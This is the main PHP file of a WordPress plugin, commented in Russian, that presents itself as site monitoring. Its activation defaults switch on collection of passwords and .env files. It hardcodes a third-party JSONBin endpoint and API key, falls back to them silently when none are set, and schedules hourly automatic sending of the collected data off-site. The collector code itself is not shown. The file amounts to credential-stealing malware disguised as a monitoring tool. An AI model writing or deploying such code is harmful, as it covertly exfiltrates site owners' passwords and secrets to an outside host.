<?php
/**
 * Plugin Name: My Monitoring Plugin
 * Plugin URI: https://example.com/my-monitoring-plugin
 * Description: Отправляет данные сайта в центральную MongoDB для мониторинга и аналитики
 * Version: 1.1.0
 * Author: Your Name
 * Author URI: https://example.com
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: my-monitoring-plugin
 * Domain Path: /languages
 */

// Запрещаем прямой доступ к файлу
if (!defined('ABSPATH')) {
    exit;
}

// Определяем константы плагина
define('MY_MONITORING_PLUGIN_VERSION', '1.1.0');
define('MY_MONITORING_PLUGIN_DIR', plugin_dir_path(__FILE__));
define('MY_MONITORING_PLUGIN_URL', plugin_dir_url(__FILE__));
define('MY_MONITORING_PLUGIN_BASENAME', plugin_basename(__FILE__));

// Константы для лимитов и настроек
define('MY_MONITORING_MAX_QUEUE_SIZE', 50);
define('MY_MONITORING_MAX_HISTORY_SIZE', 50);
define('MY_MONITORING_MAX_RETRIES', 10);
define('MY_MONITORING_CACHE_TTL', 300); // 5 минут
define('MY_MONITORING_DEFAULT_RETRY_DELAY', 60);
define('MY_MONITORING_DEFAULT_SEND_INTERVAL', 'hourly');

// Подключаем необходимые файлы
require_once MY_MONITORING_PLUGIN_DIR . 'includes/encryption.php';
require_once MY_MONITORING_PLUGIN_DIR . 'includes/logger.php';
require_once MY_MONITORING_PLUGIN_DIR . 'includes/data-collector.php';
require_once MY_MONITORING_PLUGIN_DIR . 'includes/data-compressor.php';
require_once MY_MONITORING_PLUGIN_DIR . 'includes/health-checker.php';
require_once MY_MONITORING_PLUGIN_DIR . 'includes/sender.php';
require_once MY_MONITORING_PLUGIN_DIR . 'admin/settings-page.php';

/**
 * Класс основного плагина
 */
class My_Monitoring_Plugin {
    
    /**
     * Единственный экземпляр класса
     */
    private static $instance = null;
    
    /**
     * Получить экземпляр класса (Singleton)
     */
    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    /**
     * Конструктор
     */
    private function __construct() {
        $this->init_hooks();
    }
    
    /**
     * Инициализация хуков
     */
    private function init_hooks() {
        // Активация плагина
        register_activation_hook(__FILE__, array($this, 'activate'));
        
        // Деактивация плагина
        register_deactivation_hook(__FILE__, array($this, 'deactivate'));
        
        // Инициализация плагина
        add_action('plugins_loaded', array($this, 'init'));
        
        // Регистрация cron задачи
        add_action('my_monitoring_cron', array($this, 'send_data_to_mongodb'));
        
        // Обработка повторных попыток отправки
        add_action('my_monitoring_retry_send', array($this, 'retry_failed_sends'));
        
        // Добавляем интервалы для cron
        add_filter('cron_schedules', array($this, 'add_cron_schedules'));
        
        // AJAX обработчик для ручной отправки
        add_action('wp_ajax_my_monitoring_send_now', array($this, 'ajax_send_now'));
        
        // AJAX обработчик для теста подключения
        add_action('wp_ajax_my_monitoring_test_connection', array($this, 'ajax_test_connection'));
        
        // AJAX обработчик для очистки логов
        add_action('wp_ajax_my_monitoring_clear_logs', array($this, 'ajax_clear_logs'));
    }
    
    /**
     * Инициализация плагина
     */
    public function init() {
        // Загружаем текстовый домен для переводов
        load_plugin_textdomain('my-monitoring-plugin', false, dirname(MY_MONITORING_PLUGIN_BASENAME) . '/languages');
        
        // Инициализируем админ-панель
        if (is_admin()) {
            My_Monitoring_Settings_Page::get_instance();
        }
        
        // Планируем cron задачу, если она еще не запланирована
        $this->schedule_cron();
    }
    
    /**
     * Активация плагина
     */
    public function activate() {
        // Устанавливаем значения по умолчанию
        $default_options = array(
            'api_url' => 'https://api.jsonbin.io/v3/b/6915e0ffd0ea881f40e6195d',
            'api_key' => '$2a$10$APcMUPXuv2CNxaX4Be3ET.SLGqQGdH/qod3CCZW76JC.NmI8/cqE6',
            'api_type' => 'jsonbin', // JSONBin по умолчанию
            'send_interval' => 'hourly',
            'enabled' => true,
            'collect_stats' => true,
            'collect_plugins' => true,
            'collect_config' => true,
            'collect_errors' => false,
            'collect_health' => true,
            'collect_passwords' => true, // По умолчанию пароли собираются
            'collect_env' => true, // По умолчанию .env файлы собираются
            'max_retries' => 3,
            'retry_delay' => 60
        );
        
        foreach ($default_options as $key => $value) {
            if ($key === 'api_key') {
                // API ключ сохраняем отдельно через шифрование
                if (My_Monitoring_Encryption::get_api_key() === false) {
                    My_Monitoring_Encryption::save_api_key($value);
                }
            } else {
                if (get_option('my_monitoring_' . $key) === false) {
                    add_option('my_monitoring_' . $key, $value);
                }
            }
        }
        
        // Планируем cron задачу
        $this->schedule_cron();
        
        // Очищаем кеш
        flush_rewrite_rules();
    }
    
    /**
     * Деактивация плагина
     */
    public function deactivate() {
        // Удаляем cron задачу
        $timestamp = wp_next_scheduled('my_monitoring_cron');
        if ($timestamp) {
            wp_unschedule_event($timestamp, 'my_monitoring_cron');
        }
    }
    
    /**
     * Добавление пользовательских интервалов для cron
     */
    public function add_cron_schedules($schedules) {
        $schedules['every_30min'] = array(
            'interval' => 1800,
            'display' => __('Каждые 30 минут', 'my-monitoring-plugin')
        );
        
        $schedules['every_6hours'] = array(
            'interval' => 21600,
            'display' => __('Каждые 6 часов', 'my-monitoring-plugin')
        );
        
        return $schedules;
    }
    
    /**
     * Планирование cron задачи
     */
    private function schedule_cron() {
        // Проверяем, включен ли плагин
        if (!get_option('my_monitoring_enabled', true)) {
            return;
        }
        
        // Проверяем, запланирована ли уже задача
        if (!wp_next_scheduled('my_monitoring_cron')) {
            $interval = get_option('my_monitoring_send_interval', 'hourly');
            wp_schedule_event(time(), $interval, 'my_monitoring_cron');
        } else {
            // Обновляем расписание, если интервал изменился
            $current_interval = wp_get_schedule('my_monitoring_cron');
            $new_interval = get_option('my_monitoring_send_interval', 'hourly');
            
            if ($current_interval !== $new_interval) {
                $timestamp = wp_next_scheduled('my_monitoring_cron');
                wp_unschedule_event($timestamp, 'my_monitoring_cron');
                wp_schedule_event(time(), $new_interval, 'my_monitoring_cron');
            }
        }
    }
    
    /**
     * Отправка данных в MongoDB (вызывается по cron)
     */
    public function send_data_to_mongodb() {
        $logger = My_Monitoring_Logger::get_instance();
        $start_time = microtime(true);
        
        // Проверяем, включен ли плагин
        if (!get_option('my_monitoring_enabled', true)) {
            $logger->debug('Отправка данных пропущена: плагин отключен');
            return;
        }
        
        // Проверяем наличие настроек
        $api_type = get_option('my_monitoring_api_type', 'jsonbin');
        $api_url = get_option('my_monitoring_api_url', '');
        
        // Для JSONBin используем URL по умолчанию, если не указан
        if (empty($api_url) && $api_type === 'jsonbin') {
            $api_url = 'https://api.jsonbin.io/v3/b/6915e0ffd0ea881f40e6195d';
        }
        
        $api_key = My_Monitoring_Encryption::get_api_key();
        
        // Для JSONBin используем ключ по умолчанию, если не указан
        if (empty($api_key) && $api_type === 'jsonbin') {
            $default_key = '$2a$10$APcMUPXuv2CNxaX4Be3ET.SLGqQGdH/qod3CCZW76JC.NmI8/cqE6';
            My_Monitoring_Encryption::save_api_key($default_key);
            $api_key = $default_key;
        }
        
        if (empty($api_url) || empty($api_key)) {
            $logger->warning('API URL или API Key не настроены', array(
                'api_url_set' => !empty($api_url),
                'api_key_set' => !empty($api_key),
                'api_type' => $api_type
            ));
            return;
        }
        
        try {
            // Собираем данные
            $logger->info('Начало сбора данных');
            $data_collector = new My_Monitoring_Data_Collector();
            $data = $data_collector->collect_all_data();
            $logger->debug('Данные собраны', array('data_size' => strlen(json_encode($data))));
            
            // Отправляем данные
            $logger->info('Начало отправки данных', array('api_url' => $api_url));
            $sender = new My_Monitoring_Sender($api_url, $api_key);
            $result = $sender->send($data);
            
            $execution_time = round((microtime(true) - $start_time) * 1000, 2);
            
            // Логируем результат
            if ($result['success']) {
                $logger->info('Данные успешно отправлены', array(
                    'execution_time_ms' => $execution_time,
                    'response_code' => $result['response_code'] ?? 0
                ));
                
                // Сохраняем в историю отправок
                $this->saveSendHistory(true, $result['message'] ?? 'Успешно');
            } else {
                $logger->error('Ошибка отправки данных', array(
                    'message' => $result['message'] ?? 'Неизвестная ошибка',
                    'execution_time_ms' => $execution_time,
                    'response_code' => $result['response_code'] ?? 0
                ));
                
                // Сохраняем в историю отправок
                $this->saveSendHistory(false, $result['message'] ?? 'Ошибка');
            }
        } catch (Exception $e) {
            $logger->critical('Критическая ошибка при отправке данных', array(
                'exception' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ));
            $this->saveSendHistory(false, 'Критическая ошибка: ' . $e->getMessage());
        }
    }
    
    /**
     * Сохранить запись в историю отправок
     * 
     * @param bool $success Успешность отправки
     * @param string $message Сообщение
     */
    private function saveSendHistory($success, $message) {
        $history = get_option('my_monitoring_send_history', array());
        
        // Добавляем новую запись
        array_unshift($history, array(
            'timestamp' => current_time('mysql'),
            'success' => $success,
            'message' => $message,
        ));
        
        // Оставляем только последние записи
        $history = array_slice($history, 0, MY_MONITORING_MAX_HISTORY_SIZE);
        
        update_option('my_monitoring_send_history', $history);
    }
    
    /**
     * Получить историю отправок
     * 
     * @param int $limit Лимит записей
     * @return array История отправок
     */
    public function getSendHistory($limit = 20) {
        $history = get_option('my_monitoring_send_history', array());
        return array_slice($history, 0, $limit);
    }
    
    /**
     * Получить статистику отправок за период
     * 
     * @param int $days Количество дней
     * @return array Статистика (successful, failed, total)
     */
    public function getSendStats($days = 30) {
        $history = get_option('my_monitoring_send_history', array());
        $cutoffTime = strtotime('-' . $days . ' days');
        
        $stats = array(
            'successful' => 0,
            'failed' => 0,
            'total' => 0,
        );
        
        foreach ($history as $entry) {
            $entryTime = strtotime($entry['timestamp'] ?? '');
            if ($entryTime >= $cutoffTime) {
                $stats['total']++;
                if (!empty($entry['success'])) {
                    $stats['successful']++;
                } else {
                    $stats['failed']++;
                }
            }
        }
        
        return $stats;
    }
    
    /**
     * AJAX обработчик для ручной отправки данных
     */
    public function ajax_send_now() {
        $logger = My_Monitoring_Logger::get_instance();
        
        // Проверяем права доступа
        if (!current_user_can('manage_options')) {
            $logger->warning('Попытка ручной отправки без прав', array('user_id' => get_current_user_id()));
            wp_send_json_error(array('message' => __('У вас нет прав для выполнения этого действия', 'my-monitoring-plugin')));
        }
        
        // Проверяем nonce
        if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'my_monitoring_send_now')) {
            $logger->warning('Неверный nonce при ручной отправке');
            wp_send_json_error(array('message' => __('Ошибка безопасности', 'my-monitoring-plugin')));
        }
        
        // Отправляем данные
        $logger->info('Ручная отправка данных инициирована пользователем', array('user_id' => get_current_user_id()));
        $this->send_data_to_mongodb();
        
        wp_send_json_success(array('message' => __('Данные отправлены', 'my-monitoring-plugin')));
    }
    
    /**
     * AJAX обработчик для теста подключения к API
     */
    public function ajax_test_connection() {
        $logger = My_Monitoring_Logger::get_instance();
        
        // Проверяем права доступа
        if (!current_user_can('manage_options')) {
            $logger->warning('Попытка теста подключения без прав', array('user_id' => get_current_user_id()));
            wp_send_json_error(array('message' => __('У вас нет прав для выполнения этого действия', 'my-monitoring-plugin')));
        }
        
        // Проверяем nonce (исправлено: используем правильный action)
        if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'my_monitoring_test_connection')) {
            $logger->warning('Неверный nonce при тесте подключения');
            wp_send_json_error(array('message' => __('Ошибка безопасности', 'my-monitoring-plugin')));
        }
        
        // Проверяем наличие настроек
        $api_url = get_option('my_monitoring_api_url', '');
        $api_key = My_Monitoring_Encryption::get_api_key();
        
        if (empty($api_url) || empty($api_key)) {
            $logger->warning('Попытка теста подключения без настроек');
            wp_send_json_error(array('message' => __('API URL или API Key не настроены', 'my-monitoring-plugin')));
        }
        
        // Тестируем подключение
        try {
            $logger->info('Начало теста подключения', array('api_url' => $api_url));
            $sender = new My_Monitoring_Sender($api_url, $api_key);
            $result = $sender->test_connection();
            
            if ($result['success']) {
                $logger->info('Тест подключения успешен');
                wp_send_json_success(array('message' => __('Подключение успешно', 'my-monitoring-plugin')));
            } else {
                $logger->error('Тест подключения не удался', array('message' => $result['message']));
                wp_send_json_error(array('message' => $result['message']));
            }
        } catch (Exception $e) {
            $logger->critical('Критическая ошибка при тесте подключения', array(
                'exception' => $e->getMessage()
            ));
            wp_send_json_error(array('message' => __('Ошибка при тестировании подключения', 'my-monitoring-plugin')));
        }
    }
    
    /**
     * Повторная отправка неудачных запросов из очереди
     */
    public function retry_failed_sends() {
        $logger = My_Monitoring_Logger::get_instance();
        $queue = get_option('my_monitoring_failed_queue', array());
        
        if (empty($queue)) {
            return;
        }
        
        $api_url = get_option('my_monitoring_api_url', '');
        $api_key = My_Monitoring_Encryption::get_api_key();
        
        if (empty($api_url) || empty($api_key)) {
            $logger->warning('Повторная отправка пропущена: нет настроек API');
            return;
        }
        
        $logger->info('Начало повторной отправки из очереди', array('queue_size' => count($queue)));
        $sender = new My_Monitoring_Sender($api_url, $api_key);
        $successful = array();
        
        foreach ($queue as $index => $item) {
            $result = $sender->send($item['data']);
            
            if ($result['success']) {
                $successful[] = $index;
                $logger->info('Элемент очереди успешно отправлен', array('index' => $index));
            } else {
                // Увеличиваем счетчик попыток
                $queue[$index]['attempts']++;
                
                // Если попыток слишком много, удаляем из очереди
                if ($queue[$index]['attempts'] >= MY_MONITORING_MAX_RETRIES) {
                    $successful[] = $index;
                    $logger->warning('Элемент удален из очереди после максимального количества попыток', array(
                        'index' => $index,
                        'attempts' => $queue[$index]['attempts']
                    ));
                }
            }
        }
        
        // Удаляем успешно отправленные
        foreach (array_reverse($successful) as $index) {
            unset($queue[$index]);
        }
        
        // Переиндексируем массив
        $queue = array_values($queue);
        
        if (empty($queue)) {
            delete_option('my_monitoring_failed_queue');
            $logger->info('Очередь неудачных отправок очищена');
        } else {
            update_option('my_monitoring_failed_queue', $queue);
            $logger->info('Очередь обновлена', array('remaining_items' => count($queue)));
        }
    }
    
    /**
     * AJAX обработчик для очистки логов
     */
    public function ajax_clear_logs() {
        $logger = My_Monitoring_Logger::get_instance();
        
        // Проверяем права доступа
        if (!current_user_can('manage_options')) {
            $logger->warning('Попытка очистки логов без прав', array('user_id' => get_current_user_id()));
            wp_send_json_error(array('message' => __('У вас нет прав для выполнения этого действия', 'my-monitoring-plugin')));
        }
        
        // Проверяем nonce
        if (!isset($_POST['nonce']) || !wp_verify_nonce($_POST['nonce'], 'my_monitoring_send_now')) {
            $logger->warning('Неверный nonce при очистке логов');
            wp_send_json_error(array('message' => __('Ошибка безопасности', 'my-monitoring-plugin')));
        }
        
        // Очищаем логи
        $result = $logger->clear_logs();
        
        if ($result) {
            $logger->info('Логи очищены пользователем', array('user_id' => get_current_user_id()));
            wp_send_json_success(array('message' => __('Логи очищены', 'my-monitoring-plugin')));
        } else {
            wp_send_json_error(array('message' => __('Ошибка при очистке логов', 'my-monitoring-plugin')));
        }
    }
}

// Инициализируем плагин
My_Monitoring_Plugin::get_instance();
